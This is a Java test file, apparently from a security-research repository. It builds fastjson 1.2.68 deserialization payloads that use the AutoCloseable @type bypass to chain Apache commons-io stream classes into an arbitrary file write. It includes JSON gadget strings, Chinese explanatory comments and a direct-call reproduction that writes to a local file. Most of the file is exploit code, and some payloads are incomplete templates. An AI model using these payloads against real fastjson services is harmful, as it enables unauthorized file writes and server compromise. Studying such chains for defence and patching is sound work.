package com.firebasky.fastjson.poc1268.su18;

import com.alibaba.fastjson.JSON;
import com.sun.xml.internal.fastinfoset.util.CharArray;
import com.sun.xml.internal.org.jvnet.staxex.Base64Data;
import org.apache.commons.io.ByteOrderMark;
import org.apache.commons.io.input.BOMInputStream;
import org.apache.commons.io.input.CharSequenceInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.FileWriterWithEncoding;
import org.apache.commons.io.output.WriterOutputStream;
import com.sun.xml.internal.org.jvnet.staxex.Base64Data;
import java.io.IOException;

/**
 * https://su18.org/post/fastjson-1.2.68/#bominputstream
 *
 * https://www.cnblogs.com/Raiden-xin/p/12681577.html
 */
public class test {
    public static void main(String[] args) throws IOException {
        //为什么最后使用s参数,因为防止其他参数传递不过去。


        //负责输入（文件内容）的 InputStream
        //CharSequenceInputStream 初始化输入的字符串（实际上是 CharSequence 对象）、字符编码、以及缓冲区大小（最大 255）用于创建
        // InputStream 对象；

        String poc1 ="{\n" +
                "\t\"CharSequenceInputStream\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                "\t\t\"charset\": \"UTF-8\",\n" +
                "\t\t\"bufferSize\": 1024,\n" +
                "\t\t\"cs\": {\n" +
                "\t\t\t\"@type\": \"java.lang.String\"\"bbbbb\"\n" +
                "\t\t}\n" +
                "\t}";

        //负责输出的 OutputStream
        String poc2 = "{\n" +
                "\t\"FileWriterWithEncoding\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "\t\t\"file\": \"d:/1.txt\",\n" +
                "\t\t\"encoding\": \"UTF-8\"\n" +
                "\t}\n" +
                "}";

        //负责文件路径 Writer
        //WriterOutputStream 初始化 FileWriterWithEncoding 以及一些属性，WriterOutputStream 的 write 方法会将字节进行写入
        // 如果参数 writeImmediately 为 true，会调用 OutputStreamWriter 的 write 方法进行写出。
        String poc3 = "{\n" +
                "\t\"writerOutputStream\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "\t\t\"writeImmediately\": true,\n" +
                "\t\t\"bufferSize\": 1,\n" +
                "\t\t\"charsetName\": \"UTF-8\",\n" +
                "\t\t\"writer\": {writer对象}\n" +
                "\t}\n" +
                "}";

//TeeInputStream 初始化了一个 CharSequenceInputStream 和 WriterOutputStream，无论调用TeeInputStream的任意一个read方法，
//都会将读取的内容同步调用WriterOutputStream的write方法写入其中；


//字符
        String poc4 ="{\n" +
                "\t\"TeeInputStream\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.input.TeeInputStream\",\n" +
                "\t\t\"input\": {InputStream 对象},\n" +
                "\t\t\"branch\": {OutputStream 对象},\n" +
                "\t\t\"closeBranch\": true\n" +
                "\t}\n" +
                "}";

//base64
        String base64 ="{\n" +
                "\t\"teeInputStream\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.codec.binary\",\n" +
                "\t\t\"in\": {InputStream 对象}\n" +
                "\t}\n" +
                "}";


//BOMInputStream 初始化一个 TeeInputStream 和一个 ByteOrderMark 数组，里面存放了一个指定长度的 int 数组，用来读取相应长度的输入流；
        String poc5="{\n" +
                "\t\"bOMInputStream\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "\t\t\"delegate\": {InputStream 对象},\n" +
                "\t\t\"boms\": [{\n" +
                "\t\t\t\"charsetName\": \"UTF-8\",\n" +
                "\t\t\t\"bytes\": [0, 0, 0, 0]\n" +
                "\t\t}]\n" +
                "\t}\n" +
                "}";


        Object parse = JSON.parse(poc1);
        System.out.println(parse);


        /**
         * 正向调用
         */
        char[] a = {56,55,31,32,50};
        CharArray charArray = new CharArray(a,0,5,false);

        CharSequenceInputStream inputStream    = new CharSequenceInputStream(charArray, "UTF-8", 1024*1024);
        FileWriterWithEncoding fileWriter     = new FileWriterWithEncoding("d:/12.txt", "UTF-8");
        WriterOutputStream outputStream   = new WriterOutputStream(fileWriter, "UTF-8", 4, true);
        TeeInputStream teeInputStream = new TeeInputStream(inputStream, outputStream, true);
        ByteOrderMark byteOrderMark  = new ByteOrderMark("UTF-8", new int[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0});
        BOMInputStream bomInputStream = new BOMInputStream(teeInputStream, byteOrderMark);
        bomInputStream.getBOM();
        bomInputStream.close();
    }
}
